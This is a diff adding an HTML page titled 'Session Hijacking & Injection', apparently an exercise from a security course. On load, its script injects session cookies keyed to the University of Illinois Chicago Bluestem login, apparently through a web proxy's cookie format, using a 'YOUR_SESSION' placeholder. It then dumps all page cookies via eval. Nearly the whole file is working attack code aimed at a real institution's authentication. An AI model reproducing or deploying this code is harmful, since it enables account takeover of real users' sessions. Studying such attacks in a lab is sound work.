@@ -1,0 +1,70 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="utf-8">
+    <title>Session Hijacking & Injection</title>
+    <link href="https://classless.de/classless.css" rel="stylesheet">
+    <!--[if IE]>
+    <script src="http://html5shiv.googlecode.com/svn/trunk/html5.js"></script>
+    <![endif]-->
+</head>
+
+<body id="home">
+
+<h1>4: Session Hijacking & Injection</h1>
+
+<a href="https://people.uic.edu/cgi-bin/account.cgi">https://people.uic.edu/cgi-bin/account.cgi</a>
+
+<hr>
+
+<pre id="all-cookies"></pre>
+
+<script>
+    document.addEventListener("DOMContentLoaded", function () {
+        function getTldCookie(tld) {
+            var decodedCookie = eval("decodeURIComponent(document.cookie)");
+            var cookies = Object.fromEntries(decodedCookie.split(';')
+                .map(cookie => cookie.trim())
+                .map(cookie => {
+                    return [
+                        cookie.split('=')[0],
+                        cookie.split('=').slice(1).join('=')
+                    ]
+                }))
+
+            console.log("All Cookies:", cookies);
+
+            if (tld !== "") {
+                var tldCookies = Object.keys(cookies).filter(cookieKey => {
+                    console.log(cookieKey)
+                    if (cookieKey.indexOf(tld) > -1) {
+                        return true
+                    }
+                    return false
+                })
+
+                console.log("Target TLD Cookies", tldCookies)
+                return tldCookies.reduce((a, e) => (a[e] = cookies[e], a), {});
+            }
+
+            return cookies
+
+        }
+
+        function setCookie(name, value) {
+            var date = new Date();
+            date.setTime(date.getTime() + 18000000);
+            expires = "; expires=" + date.toUTCString();
+            document.cookie = name + "=" + (value || "") + expires + "; path=/";
+        }
+
+
+        setCookie("c[uic.edu][/][Bluestem_people%2Euic%2Eedu]", "YOUR_SESSION")
+        setCookie("c[uic.edu][/][BluestemID_login%2Euic%2Eedu]", "YOUR_SESSION")
+        document.getElementById("all-cookies").innerHTML = JSON.stringify(getTldCookie(""), null, 4);
+    })
+</script>
+</body>
+
+</html>
